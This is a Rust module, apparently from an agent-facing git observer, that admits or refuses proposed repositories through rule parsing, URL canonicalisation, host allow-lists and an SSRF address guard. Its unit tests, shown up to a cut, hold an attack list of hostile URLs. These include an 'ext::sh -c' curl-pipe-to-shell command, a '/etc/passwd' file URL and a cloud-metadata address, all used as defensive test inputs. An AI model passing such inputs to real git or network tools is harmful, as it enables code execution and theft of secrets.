//! Whether a repository an agent proposes is taken on (docs/architecture/proposals.md, "Deciding"). A pure
//! function of the proposal, the signed rules, how full the set is and what the host name resolves to: no clock,
//! no network and no state of its own, so that every rule, and the order they apply in, can be checked without a
//! cluster.
//!
//! Everything in a proposal is untrusted text: it came from an issue, a project name, a web page. What is passed
//! on when a proposal is accepted is the canonical form of its URL (`git_agent_common::remote`), never the text it
//! arrived as.

use git_agent_common::remote::{canonical_repository, credential_name_problem};
use polar::graph::nodes::git::RepoId;
use polar_crypto::registry::{host_matches, pattern_problem};
use serde_json::Value;
use std::collections::{BTreeMap, HashSet};
use std::net::IpAddr;

/// The only kind of proposal this controller owns.
pub const KIND: &str = "observe-repo";

/// Bounds on what a set of rules may hold, so a signed document cannot make the controller work without limit.
pub const MAX_LIST: usize = 1000;
pub const DEFAULT_MAX_ENTRIES: usize = 500;
pub const MAX_MAX_ENTRIES: usize = 10_000;
pub const DEFAULT_PER_PROPOSER_PER_HOUR: usize = 20;
pub const MAX_PER_PROPOSER_PER_HOUR: usize = 1000;

/// A credential bound to the hosts a pattern names.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Binding {
    pub host: String,
    pub name: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Limits {
    pub max_entries: usize,
    pub per_proposer_per_hour: usize,
}

/// The `rules` of an `admission` document for the `observe-repo` kind.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rules {
    /// Host patterns a repository may be on. Nothing outside them is accepted.
    pub hosts: Vec<String>,
    /// Per host pattern, the organisations (the first path segment, in lower case) a repository on a matching
    /// host may belong to. A host no entry names is not restricted.
    pub organisations: BTreeMap<String, Vec<String>>,
    /// The identities, as the broker names them, that may propose.
    pub proposers: Vec<String>,
    /// Whether an accepted-in-every-other-way proposal still waits for a person to list it in `approved`.
    pub require_approval: bool,
    /// Repository ids (so every spelling of a URL is one entry) a person has approved.
    pub approved: HashSet<RepoId>,
    /// Repository ids that are never accepted.
    pub denied: HashSet<RepoId>,
    /// Which credential a repository on a host uses.
    pub credentials: Vec<Binding>,
    /// Host patterns where no credential is needed.
    pub anonymous: Vec<String>,
    pub limits: Limits,
}

impl Rules {
    /// The rules a signed `admission` section body holds, or every problem with it.
    pub fn parse(body: &Value) -> Result<Rules, Vec<String>> {
        let Some(object) = body.as_object() else {
            return Err(vec!["the body must be an object".to_string()]);
        };
        let mut problems: Vec<String> = object
            .keys()
            .filter(|k| !["kind", "rules"].contains(&k.as_str()))
            .map(|k| format!("`{k}` is not a field of this section"))
            .collect();
        if object.get("kind").and_then(Value::as_str) != Some(KIND) {
            problems.push(format!("`kind` must be \"{KIND}\""));
        }
        let Some(rules) = object.get("rules").and_then(Value::as_object) else {
            problems.push("`rules` must be an object".to_string());
            return Err(problems);
        };
        const FIELDS: [&str; 9] = [
            "hosts",
            "organisations",
            "proposers",
            "require_approval",
            "approved",
            "denied",
            "credentials",
            "anonymous",
            "limits",
        ];
        for key in rules.keys().filter(|k| !FIELDS.contains(&k.as_str())) {
            problems.push(format!("rules: `{key}` is not a rule"));
        }

        let hosts = pattern_list(rules, "hosts", true, &mut problems);
        let proposers = identity_list(rules, "proposers", &mut problems);
        let anonymous = pattern_list(rules, "anonymous", false, &mut problems);
        let approved = repo_list(rules, "approved", &mut problems);
        let denied = repo_list(rules, "denied", &mut problems);

        let require_approval = match rules.get("require_approval") {
            None | Some(Value::Null) => true,
            Some(Value::Bool(b)) => *b,
            Some(_) => {
                problems.push("rules.require_approval must be true or false".to_string());
                true
            }
        };

        let mut organisations: BTreeMap<String, Vec<String>> = BTreeMap::new();
        match rules.get("organisations") {
            None | Some(Value::Null) => {}
            Some(Value::Object(map)) => {
                if map.len() > MAX_LIST {
                    problems.push(format!(
                        "rules.organisations has {} entries, and at most {MAX_LIST} are taken",
                        map.len()
                    ));
                }
                for (pattern, orgs) in map {
                    if let Some(why) = pattern_problem(pattern) {
                        problems.push(format!("rules.organisations: `{pattern}`: {why}"));
                        continue;
                    }
                    let names: Option<Vec<String>> = orgs.as_array().and_then(|list| {
                        list.iter()
                            .map(|v| {
                                v.as_str()
                                    .filter(|n| {
                                        !n.is_empty()
                                            && n.len() <= 100
                                            && !n.contains('/')
                                            && !n
                                                .chars()
                                                .any(|c| c.is_control() || c.is_whitespace())
                                    })
                                    .map(str::to_ascii_lowercase)
                            })
                            .collect()
                    });
                    match names {
                        Some(names) if !names.is_empty() => {
                            organisations.insert(pattern.to_ascii_lowercase(), names);
                        }
                        _ => problems.push(format!(
                            "rules.organisations: `{pattern}` must be a list of organisation names"
                        )),
                    }
                }
            }
            Some(_) => problems.push("rules.organisations must be an object".to_string()),
        }

        let mut credentials = Vec::new();
        match rules.get("credentials") {
            None | Some(Value::Null) => {}
            Some(Value::Array(list)) if list.len() <= MAX_LIST => {
                for (i, item) in list.iter().enumerate() {
                    let Some(entry) = item.as_object() else {
                        problems.push(format!("rules.credentials[{i}] must be an object"));
                        continue;
                    };
                    for key in entry
                        .keys()
                        .filter(|k| !["host", "name"].contains(&k.as_str()))
                    {
                        problems.push(format!("rules.credentials[{i}]: `{key}` is not a field"));
                    }
                    let host = entry.get("host").and_then(Value::as_str);
                    let name = entry.get("name").and_then(Value::as_str);
                    match (host, name) {
                        (Some(host), Some(name)) => {
                            let mut ok = true;
                            if let Some(why) = pattern_problem(host) {
                                problems.push(format!("rules.credentials[{i}].host: {why}"));
                                ok = false;
                            }
                            if let Some(why) = credential_name_problem(name) {
                                problems.push(format!("rules.credentials[{i}].name {why}"));
                                ok = false;
                            }
                            if ok {
                                credentials.push(Binding {
                                    host: host.to_ascii_lowercase(),
                                    name: name.to_string(),
                                });
                            }
                        }
                        _ => problems.push(format!(
                            "rules.credentials[{i}] needs a `host` pattern and a `name`, both text"
                        )),
                    }
                }
            }
            Some(_) => problems.push(format!(
                "rules.credentials must be a list of at most {MAX_LIST} entries"
            )),
        }

        let mut limits = Limits {
            max_entries: DEFAULT_MAX_ENTRIES,
            per_proposer_per_hour: DEFAULT_PER_PROPOSER_PER_HOUR,
        };
        match rules.get("limits") {
            None | Some(Value::Null) => {}
            Some(Value::Object(map)) => {
                for key in map
                    .keys()
                    .filter(|k| !["max_entries", "per_proposer_per_hour"].contains(&k.as_str()))
                {
                    problems.push(format!("rules.limits: `{key}` is not a limit"));
                }
                let mut bounded = |key: &str, max: usize, into: &mut usize| match map.get(key) {
                    None | Some(Value::Null) => {}
                    Some(v) => match v.as_u64().filter(|n| (1..=max as u64).contains(n)) {
                        Some(n) => *into = n as usize,
                        None => problems.push(format!(
                            "rules.limits.{key} must be a whole number from 1 to {max}"
                        )),
                    },
                };
                bounded("max_entries", MAX_MAX_ENTRIES, &mut limits.max_entries);
                bounded(
                    "per_proposer_per_hour",
                    MAX_PER_PROPOSER_PER_HOUR,
                    &mut limits.per_proposer_per_hour,
                );
            }
            Some(_) => problems.push("rules.limits must be an object".to_string()),
        }

        if !problems.is_empty() {
            return Err(problems);
        }
        Ok(Rules {
            hosts: hosts.unwrap_or_default(),
            organisations,
            proposers: proposers.unwrap_or_default(),
            require_approval,
            approved,
            denied,
            credentials,
            anonymous: anonymous.unwrap_or_default(),
            limits,
        })
    }
}

/// A list of host patterns. `required` says whether leaving it out is a problem.
fn pattern_list(
    rules: &serde_json::Map<String, Value>,
    key: &str,
    required: bool,
    problems: &mut Vec<String>,
) -> Option<Vec<String>> {
    let items = string_items(rules, key, required, problems)?;
    let mut out = Vec::new();
    for (i, item) in items.into_iter().enumerate() {
        match pattern_problem(&item) {
            None => out.push(item.to_ascii_lowercase()),
            Some(why) => problems.push(format!("rules.{key}[{i}]: {why}")),
        }
    }
    Some(out)
}

/// The identities that may propose: text with no space or control character, 1 to 253 characters.
fn identity_list(
    rules: &serde_json::Map<String, Value>,
    key: &str,
    problems: &mut Vec<String>,
) -> Option<Vec<String>> {
    let items = string_items(rules, key, true, problems)?;
    let mut out = Vec::new();
    for (i, item) in items.into_iter().enumerate() {
        if item.is_empty()
            || item.len() > 253
            || item.chars().any(|c| c.is_control() || c.is_whitespace())
        {
            problems.push(format!(
                "rules.{key}[{i}] must be an identity: 1 to 253 characters, no space or control character"
            ));
        } else {
            out.push(item);
        }
    }
    Some(out)
}

/// A list of repository URLs, kept as the ids they name.
fn repo_list(
    rules: &serde_json::Map<String, Value>,
    key: &str,
    problems: &mut Vec<String>,
) -> HashSet<RepoId> {
    let mut out = HashSet::new();
    for (i, item) in string_items(rules, key, false, problems)
        .unwrap_or_default()
        .into_iter()
        .enumerate()
    {
        match canonical_repository(&item) {
            Ok(c) => {
                out.insert(c.repo_id());
            }
            Err(why) => problems.push(format!("rules.{key}[{i}]: {why}")),
        }
    }
    out
}

/// The strings of a list under `key`, or the problem with it. At most [`MAX_LIST`].
fn string_items(
    rules: &serde_json::Map<String, Value>,
    key: &str,
    required: bool,
    problems: &mut Vec<String>,
) -> Option<Vec<String>> {
    match rules.get(key) {
        None | Some(Value::Null) => {
            if required {
                problems.push(format!("rules.{key} is required: a list"));
            }
            None
        }
        Some(Value::Array(list)) => {
            if list.len() > MAX_LIST {
                problems.push(format!(
                    "rules.{key} has {} entries, and at most {MAX_LIST} are taken",
                    list.len()
                ));
                return None;
            }
            let mut out = Vec::new();
            for (i, v) in list.iter().enumerate() {
                match v.as_str() {
                    Some(text) => out.push(text.to_string()),
                    None => problems.push(format!("rules.{key}[{i}] must be text")),
                }
            }
            Some(out)
        }
        Some(_) => {
            problems.push(format!("rules.{key} must be a list"));
            None
        }
    }
}

/// What is asked of the controller.
#[derive(Debug, Clone, Copy)]
pub struct Proposal<'a> {
    pub kind: &'a str,
    /// The repository URL as the proposer found it. Untrusted.
    pub url: &'a str,
    /// Who published it, as the broker says. `None` if the broker did not say.
    pub proposer: Option<&'a str>,
}

/// How the set stands when a proposal is judged.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Standing {
    /// Entries already in the set, not counting this proposal's own if it is already there (so asking again
    /// about an accepted entry does not count it against the limit).
    pub accepted_entries: usize,
    /// Distinct repositories this proposer has proposed in the last hour, not counting this one.
    pub proposed_this_hour: usize,
}

/// The rule that refused a proposal.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rule {
    Kind,
    Proposer,
    Url,
    Denied,
    Host,
    Organisation,
    Network,
    Limits,
}

impl Rule {
    pub fn as_str(&self) -> &'static str {
        match self {
            Rule::Kind => "kind",
            Rule::Proposer => "proposer",
            Rule::Url => "url",
            Rule::Denied => "denied",
            Rule::Host => "host",
            Rule::Organisation => "organisation",
            Rule::Network => "network",
            Rule::Limits => "limits",
        }
    }
}

/// What a proposal that is not refused is waiting for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Waiting {
    /// No admission rules have been received: nothing is accepted until there are.
    Rules,
    /// The host name did not resolve (yet).
    Network,
    /// A person has to approve it.
    Approval,
    /// No credential is bound to its host and the host is not listed as anonymous.
    Credential,
}

impl Waiting {
    pub fn as_str(&self) -> &'static str {
        match self {
            Waiting::Rules => "no admission rules",
            Waiting::Network => "name resolution",
            Waiting::Approval => "awaiting approval",
            Waiting::Credential => "no credential",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Accepted {
    /// The canonical URL: what the observer is told.
    pub url: String,
    pub repo_id: RepoId,
    /// The credential to name, if the host has one bound.
    pub credential: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Accepted(Accepted),
    Rejected { rule: Rule, reason: String },
    Pending { waiting: Waiting, reason: String },
}

/// What a host name resolves to, or why it did not.
pub type Resolution = Result<Vec<IpAddr>, String>;

/// Why a connection to `address` must never be made on a proposal's say-so, if it must not: anything that is not
/// an ordinary public address (this host, a private network, the cluster, link-local including the cloud
/// metadata address, shared, documentation, benchmarking, multicast, reserved, and every IPv6 form that carries
/// one of those).
pub fn address_problem(address: IpAddr) -> Option<&'static str> {
    match address {
        IpAddr::V4(a) => {
            let [a, b, c, _] = a.octets();
            match (a, b, c) {
                (0, ..) => Some("this network (0.0.0.0/8)"),
                (10, ..) => Some("a private network (10.0.0.0/8)"),
                (100, b, _) if b & 0xc0 == 64 => Some("shared address space (100.64.0.0/10)"),
                (127, ..) => Some("this host (127.0.0.0/8)"),
                (169, 254, _) => {
                    Some("a link-local address (169.254.0.0/16, which includes cloud metadata)")
                }
                (172, b, _) if b & 0xf0 == 16 => Some("a private network (172.16.0.0/12)"),
                (192, 0, 0) => Some("an IETF protocol assignment (192.0.0.0/24)"),
                (192, 0, 2) => Some("a documentation address (192.0.2.0/24)"),
                (192, 168, _) => Some("a private network (192.168.0.0/16)"),
                (198, b, _) if b & 0xfe == 18 => Some("a benchmarking address (198.18.0.0/15)"),
                (198, 51, 100) => Some("a documentation address (198.51.100.0/24)"),
                (203, 0, 113) => Some("a documentation address (203.0.113.0/24)"),
                (224..=239, ..) => Some("a multicast address"),
                (240..=255, ..) => {
                    Some("a reserved address (240.0.0.0/4, which includes the broadcast address)")
                }
                _ => None,
            }
        }
        IpAddr::V6(a) => {
            if a.to_ipv4_mapped().is_some() {
                return Some("an IPv4-mapped IPv6 address");
            }
            let segments = a.segments();
            // Only global unicast, 2000::/3, is allowed; everything else (this host, link-local, unique-local,
            // multicast, NAT64, discard, ...) is refused by not being in it.
            if segments[0] & 0xe000 != 0x2000 {
                return Some("not a global unicast IPv6 address");
            }
            match (segments[0], segments[1]) {
                (0x2001, 0x0db8) => Some("a documentation address (2001:db8::/32)"),
                (0x2001, 0x0000) => Some("a Teredo tunnel address (2001::/32)"),
                (0x2002, _) => Some("a 6to4 address (2002::/16), which carries an IPv4 address"),
                _ => None,
            }
        }
    }
}

/// Judges one proposal. `rules` is `None` until a verified `admission` document has been received, and then
/// nothing is accepted. `resolve` is asked for the host's addresses only if the proposal gets as far as the
/// network guard.
pub fn decide(
    proposal: &Proposal<'_>,
    rules: Option<&Rules>,
    standing: &Standing,
    resolve: &dyn Fn(&str) -> Resolution,
) -> Decision {
    let refuse = |rule: Rule, reason: String| Decision::Rejected { rule, reason };
    let wait = |waiting: Waiting, reason: String| Decision::Pending { waiting, reason };

    if proposal.kind != KIND {
        return refuse(
            Rule::Kind,
            format!(
                "this controller takes proposals of kind `{KIND}`, not `{}`",
                proposal.kind
            ),
        );
    }
    // Until there are rules nothing is accepted, and nothing else is looked at.
    let Some(rules) = rules else {
        return wait(
            Waiting::Rules,
            "no admission rules have been received, so nothing is accepted".to_string(),
        );
    };

    // 1. Who proposed it.
    let Some(proposer) = proposal.proposer else {
        return refuse(
            Rule::Proposer,
            "the broker did not say who published the proposal".to_string(),
        );
    };
    if !rules.proposers.iter().any(|p| p == proposer) {
        return refuse(
            Rule::Proposer,
            format!("`{proposer}` is not one of the identities that may propose"),
        );
    }

    // 2. The URL, read once; what is passed on is what it was turned into.
    let repository = match canonical_repository(proposal.url) {
        Ok(r) => r,
        Err(why) => return refuse(Rule::Url, why),
    };
    let repo_id = repository.repo_id();

    // 3. Never accepted.
    if rules.denied.contains(&repo_id) {
        return refuse(
            Rule::Denied,
            "the rules list this repository as denied".to_string(),
        );
    }

    // 4. The host, and the organisation.
    let host = repository.host.as_str();
    if !rules
        .hosts
        .iter()
        .any(|pattern| host_matches(pattern, host))
    {
        return refuse(
            Rule::Host,
            format!("repositories on `{host}` are not accepted"),
        );
    }
    let organisation = repository
        .path
        .first()
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_default();
    for (pattern, allowed) in &rules.organisations {
        if host_matches(pattern, host) && !allowed.contains(&organisation) {
            return refuse(
                Rule::Organisation,
                format!("repositories of `{organisation}` on `{host}` are not accepted"),
            );
        }
    }

    // 5. The network guard: every address the name resolves to must be an ordinary public one.
    match resolve(host) {
        Err(why) => {
            return wait(Waiting::Network, format!("`{host}` did not resolve: {why}"));
        }
        Ok(addresses) if addresses.is_empty() => {
            return wait(Waiting::Network, format!("`{host}` resolved to no address"));
        }
        Ok(addresses) => {
            for address in addresses {
                if let Some(why) = address_problem(address) {
                    return refuse(
                        Rule::Network,
                        format!("`{host}` resolves to {address}, {why}"),
                    );
                }
            }
        }
    }

    // 6. Limits.
    if standing.accepted_entries >= rules.limits.max_entries {
        return refuse(
            Rule::Limits,
            format!(
                "the set already holds {} repositories",
                rules.limits.max_entries
            ),
        );
    }
    if standing.proposed_this_hour >= rules.limits.per_proposer_per_hour {
        return refuse(
            Rule::Limits,
            format!(
                "`{proposer}` has already proposed {} repositories this hour",
                rules.limits.per_proposer_per_hour
            ),
        );
    }

    // 7. A person's approval.
    if rules.require_approval && !rules.approved.contains(&repo_id) {
        return wait(
            Waiting::Approval,
            "the rules require a person to approve it".to_string(),
        );
    }

    // 8. A credential, or a host that needs none.
    let credential = rules
        .credentials
        .iter()
        .find(|b| host_matches(&b.host, host))
        .map(|b| b.name.clone());
    if credential.is_none() && !rules.anonymous.iter().any(|p| host_matches(p, host)) {
        return wait(
            Waiting::Credential,
            format!("no credential is bound to `{host}`, and it is not listed as anonymous"),
        );
    }

    // 9. Accepted.
    Decision::Accepted(Accepted {
        url: repository.url,
        repo_id,
        credential,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::cell::Cell;
    use std::net::{Ipv4Addr, Ipv6Addr};

    const JIRA: &str = "jira-consumer.polar.serviceaccount.cluster.local";
    const GITLAB: &str = "gitlab-consumer.polar.serviceaccount.cluster.local";

    fn public() -> Resolution {
        Ok(vec![IpAddr::V4(Ipv4Addr::new(140, 82, 112, 3))])
    }

    fn base() -> Rules {
        Rules {
            hosts: vec!["github.com".into(), "*.example.org".into()],
            organisations: BTreeMap::new(),
            proposers: vec![JIRA.into(), GITLAB.into()],
            require_approval: false,
            approved: HashSet::new(),
            denied: HashSet::new(),
            credentials: vec![],
            anonymous: vec!["github.com".into(), "*.example.org".into()],
            limits: Limits {
                max_entries: 500,
                per_proposer_per_hour: 20,
            },
        }
    }

    fn standing() -> Standing {
        Standing {
            accepted_entries: 0,
            proposed_this_hour: 0,
        }
    }

    fn id(url: &str) -> RepoId {
        canonical_repository(url).unwrap().repo_id()
    }

    /// Decides `url` from `proposer`, counting how often the resolver was asked.
    fn ask_with(
        url: &str,
        proposer: Option<&str>,
        rules: Option<&Rules>,
        standing: Standing,
        resolution: Resolution,
    ) -> (Decision, usize) {
        let asked = Cell::new(0);
        let decision = decide(
            &Proposal {
                kind: KIND,
                url,
                proposer,
            },
            rules,
            &standing,
            &|_| {
                asked.set(asked.get() + 1);
                resolution.clone()
            },
        );
        (decision, asked.get())
    }

    fn ask(url: &str, rules: &Rules) -> Decision {
        ask_with(url, Some(JIRA), Some(rules), standing(), public()).0
    }

    fn rejected(rule: Rule) -> impl Fn(&Decision) -> bool {
        move |d| matches!(d, Decision::Rejected { rule: r, .. } if *r == rule)
    }

    fn pending(waiting: Waiting) -> impl Fn(&Decision) -> bool {
        move |d| matches!(d, Decision::Pending { waiting: w, .. } if *w == waiting)
    }

    fn reason(d: &Decision) -> &str {
        match d {
            Decision::Rejected { reason, .. } | Decision::Pending { reason, .. } => reason,
            Decision::Accepted(_) => "",
        }
    }

    // --- nothing is accepted until there are rules

    #[test]
    fn with_no_rules_nothing_is_accepted_and_the_network_is_not_touched() {
        let (d, resolved) = ask_with(
            "https://github.com/o/r",
            Some(JIRA),
            None,
            standing(),
            public(),
        );
        assert!(pending(Waiting::Rules)(&d), "{d:?}");
        assert_eq!(resolved, 0);
        assert!(reason(&d).contains("no admission rules"));
    }

    #[test]
    fn a_proposal_of_another_kind_is_refused() {
        let d = decide(
            &Proposal {
                kind: "observe-bucket",
                url: "https://github.com/o/r",
                proposer: Some(JIRA),
            },
            Some(&base()),
            &standing(),
            &|_| public(),
        );
        assert!(rejected(Rule::Kind)(&d), "{d:?}");
    }

    // --- 1: who proposed it

    #[test]
    fn a_proposal_with_no_publisher_identity_is_refused() {
        let (d, resolved) = ask_with(
            "https://github.com/o/r",
            None,
            Some(&base()),
            standing(),
            public(),
        );
        assert!(rejected(Rule::Proposer)(&d), "{d:?}");
        assert_eq!(resolved, 0);
    }

    #[test]
    fn a_proposer_the_rules_do_not_list_is_refused_and_a_listed_one_is_not() {
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some("stranger.polar.serviceaccount.cluster.local"),
            Some(&base()),
            standing(),
            public(),
        );
        assert!(rejected(Rule::Proposer)(&d), "{d:?}");
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some(GITLAB),
            Some(&base()),
            standing(),
            public(),
        );
        assert!(matches!(d, Decision::Accepted(_)), "{d:?}");
    }

    #[test]
    fn an_identity_is_compared_whole_not_by_prefix_or_case() {
        let mut rules = base();
        rules.proposers = vec!["jira-consumer".into()];
        for other in ["jira-consumer.evil", "Jira-Consumer", "jira-consume", ""] {
            let (d, _) = ask_with(
                "https://github.com/o/r",
                Some(other),
                Some(&rules),
                standing(),
                public(),
            );
            assert!(rejected(Rule::Proposer)(&d), "{other:?}: {d:?}");
        }
    }

    #[test]
    fn rules_that_list_no_proposer_let_nobody_propose() {
        let mut rules = base();
        rules.proposers.clear();
        assert!(rejected(Rule::Proposer)(&ask(
            "https://github.com/o/r",
            &rules
        )));
    }

    // --- 2: the URL, the attack list

    #[test]
    fn text_that_is_not_the_https_url_of_a_repository_is_refused_before_the_network_is_asked() {
        for url in [
            "ext::sh -c 'curl evil | sh'",
            "ext::https://github.com/o/r",
            "file:///etc/passwd",
            "ssh://git@github.com/o/r.git",
            "git@github.com:o/r.git",
            "http://github.com/o/r",
            "https://user:secret@github.com/o/r",
            "https://github.com@evil.example.net/o/r",
            "https://127.0.0.1/o/r",
            "https://169.254.169.254/latest/meta-data/",
            "https://[::1]/o/r",
            "https://2130706433/o/r",
            "https://github.com/o/r?service=git-upload-pack",
            "https://github.com/o%2fx/r",
            "https://github.com./o/r",
            "https://evil.example.net\\@github.com/o/r",
            "https://github.com/",
            "",
        ] {
            let (d, resolved) = ask_with(url, Some(JIRA), Some(&base()), standing(), public());
            assert!(rejected(Rule::Url)(&d), "{url:?}: {d:?}");
            assert_eq!(resolved, 0, "{url:?} reached the network guard");
        }
    }

    #[test]
    fn a_very_long_url_is_refused() {
        let url = format!("https://github.com/o/{}", "r".repeat(5000));
        assert!(rejected(Rule::Url)(&ask(&url, &base())));
    }

    // --- 3: denied

    #[test]
    fn a_denied_repository_is_refused_in_every_spelling() {
        let mut rules = base();
        rules.denied.insert(id("https://github.com/o/r"));
        for url in [
            "https://github.com/o/r",
            "https://github.com/o/r.git",
            "HTTPS://GitHub.com:443/o/r/",
            "https://github.com/o/r#frag",
        ] {
            assert!(rejected(Rule::Denied)(&ask(url, &rules)), "{url}");
        }
        assert!(matches!(
            ask("https://github.com/o/other", &rules),
            Decision::Accepted(_)
        ));
    }

    #[test]
    fn denied_wins_over_approved() {
        let mut rules = base();
        rules.require_approval = true;
        rules.approved.insert(id("https://github.com/o/r"));
        rules.denied.insert(id("https://github.com/o/r"));
        assert!(rejected(Rule::Denied)(&ask(
            "https://github.com/o/r",
            &rules
        )));
    }

    // --- 4: the host, and the organisation

    #[test]
    fn a_host_the_rules_do_not_allow_is_refused() {
        let rules = base();
        for url in [
            "https://gitlab.com/o/r",
            "https://evilgithub.com/o/r",
            "https://github.com.evil.example.net/o/r",
            "https://xgithub.com/o/r",
            "https://example.org/o/r", // the bare domain is not `*.example.org`
            "https://evilexample.org/o/r",
        ] {
            let (d, resolved) = ask_with(url, Some(JIRA), Some(&rules), standing(), public());
            assert!(rejected(Rule::Host)(&d), "{url}: {d:?}");
            assert_eq!(resolved, 0);
        }
        for url in [
            "https://github.com/o/r",
            "https://GITHUB.COM/o/r",
            "https://git.example.org/o/r",
            "https://a.b.example.org/o/r",
        ] {
            assert!(matches!(ask(url, &rules), Decision::Accepted(_)), "{url}");
        }
    }

    #[test]
    fn a_host_pattern_is_matched_the_way_a_credential_is() {
        // The matcher is the one the observer's CryptoActor uses, so that the controller never accepts a
        // repository for a host the observer would not give the credential to, or the other way round.
        for (pattern, host) in [
            ("github.com", "github.com"),
            ("*.example.org", "git.example.org"),
            ("*.example.org", "example.org"),
            ("*.example.org", "evilexample.org"),
        ] {
            let mut rules = base();
            rules.hosts = vec![pattern.into()];
            let accepted = matches!(
                ask(&format!("https://{host}/o/r"), &rules),
                Decision::Accepted(_)
            );
            assert_eq!(accepted, host_matches(pattern, host), "{pattern} / {host}");
        }
    }

    #[test]
    fn an_organisation_the_rules_restrict_a_host_to_is_the_only_one_accepted() {
        let mut rules = base();
        rules
            .organisations
            .insert("github.com".into(), vec!["cmu-sei".into()]);
        assert!(matches!(
            ask("https://github.com/cmu-sei/Polar.git", &rules),
            Decision::Accepted(_)
        ));
        assert!(matches!(
            ask("https://github.com/CMU-SEI/Polar.git", &rules),
            Decision::Accepted(_)
        ));
        assert!(rejected(Rule::Organisation)(&ask(
            "https://github.com/someone-else/Polar.git",
            &rules
        )));
        assert!(rejected(Rule::Organisation)(&ask(
            "https://github.com/cmu-sei-evil/x",
            &rules
        )));
        assert!(
            matches!(
                ask("https://git.example.org/anyone/x", &rules),
                Decision::Accepted(_)
            ),
            "a host no entry names is not restricted"
        );
    }

    // --- 5: the network guard

    #[test]
    fn a_name_that_resolves_to_an_address_that_is_not_public_is_refused() {
        for bad in [
            IpAddr::V4(Ipv4Addr::new(10, 96, 0, 1)), // a cluster service
            IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
            IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254)), // cloud metadata
            IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)),
            IpAddr::V6(Ipv6Addr::LOCALHOST),
        ] {
            let (d, resolved) = ask_with(
                "https://github.com/o/r",
                Some(JIRA),
                Some(&base()),
                standing(),
                Ok(vec![bad]),
            );
            assert!(rejected(Rule::Network)(&d), "{bad}: {d:?}");
            assert_eq!(resolved, 1);
            assert!(reason(&d).contains(&bad.to_string()), "{}", reason(&d));
        }
    }

    #[test]
    fn one_bad_address_among_good_ones_refuses_the_name() {
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some(JIRA),
            Some(&base()),
            standing(),
            Ok(vec![
                IpAddr::V4(Ipv4Addr::new(140, 82, 112, 3)),
                IpAddr::V4(Ipv4Addr::new(10, 0, 0, 5)),
            ]),
        );
        assert!(rejected(Rule::Network)(&d), "{d:?}");
    }

    #[test]
    fn a_name_that_does_not_resolve_waits_and_is_not_accepted() {
        for resolution in [Err("no such host".to_string()), Ok(vec![])] {
            let (d, _) = ask_with(
                "https://github.com/o/r",
                Some(JIRA),
                Some(&base()),
                standing(),
                resolution,
            );
            assert!(pending(Waiting::Network)(&d), "{d:?}");
        }
    }

    #[test]
    fn the_guard_knows_which_addresses_are_public() {
        let v4 = |a, b, c, d| IpAddr::V4(Ipv4Addr::new(a, b, c, d));
        for ok in [
            v4(8, 8, 8, 8),
            v4(140, 82, 112, 3),
            v4(1, 1, 1, 1),
            v4(172, 15, 0, 1),
            v4(172, 32, 0, 1),
            v4(100, 63, 0, 1),
            v4(100, 128, 0, 1),
        ] {
            assert_eq!(address_problem(ok), None, "{ok}");
        }
        for bad in [
            v4(0, 0, 0, 0),
            v4(0, 1, 2, 3),
            v4(10, 0, 0, 1),
            v4(10, 255, 255, 255),
            v4(100, 64, 0, 1),
            v4(100, 127, 255, 255),
            v4(127, 0, 0, 1),
            v4(127, 255, 255, 254),
            v4(169, 254, 0, 1),
            v4(172, 16, 0, 1),
            v4(172, 31, 255, 255),
            v4(192, 0, 0, 1),
            v4(192, 0, 2, 1),
            v4(192, 168, 0, 1),
            v4(198, 18, 0, 1),
            v4(198, 19, 255, 255),
            v4(198, 51, 100, 1),
            v4(203, 0, 113, 1),
            v4(224, 0, 0, 1),
            v4(239, 255, 255, 255),
            v4(240, 0, 0, 1),
            v4(255, 255, 255, 255),
        ] {
            assert!(address_problem(bad).is_some(), "{bad}");
        }
        let v6 = |s: &str| IpAddr::V6(s.parse::<Ipv6Addr>().unwrap());
        for ok in [v6("2606:4700:4700::1111"), v6("2a00:1450:4009:81f::200e")] {
            assert_eq!(address_problem(ok), None, "{ok}");
        }
        for bad in [
            "::",
            "::1",
            "fe80::1",
            "fc00::1",
            "fd12:3456::1",
            "ff02::1",
            "2001:db8::1",
            "::ffff:127.0.0.1",
            "::ffff:10.0.0.1",
            "::ffff:169.254.169.254",
            "64:ff9b::7f00:1",
            "2002:7f00:1::1",
            "2001::1",
            "100::1",
        ] {
            assert!(address_problem(v6(bad)).is_some(), "{bad}");
        }
        // An IPv4-mapped address of a public host is still refused: a name has no business resolving to one.
        assert!(address_problem(v6("::ffff:8.8.8.8")).is_some());
        // and it is named for what it is, which is what a person reading the reason needs
        assert!(
            address_problem(v6("::ffff:127.0.0.1"))
                .unwrap()
                .contains("IPv4-mapped")
        );
    }

    // --- 6: limits

    #[test]
    fn a_full_set_takes_no_more() {
        let rules = base();
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some(JIRA),
            Some(&rules),
            Standing {
                accepted_entries: 500,
                proposed_this_hour: 0,
            },
            public(),
        );
        assert!(rejected(Rule::Limits)(&d), "{d:?}");
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some(JIRA),
            Some(&rules),
            Standing {
                accepted_entries: 499,
                proposed_this_hour: 0,
            },
            public(),
        );
        assert!(matches!(d, Decision::Accepted(_)), "{d:?}");
    }

    #[test]
    fn a_proposer_that_floods_is_refused() {
        let rules = base();
        let at = |n| {
            ask_with(
                "https://github.com/o/r",
                Some(JIRA),
                Some(&rules),
                Standing {
                    accepted_entries: 0,
                    proposed_this_hour: n,
                },
                public(),
            )
            .0
        };
        assert!(matches!(at(19), Decision::Accepted(_)));
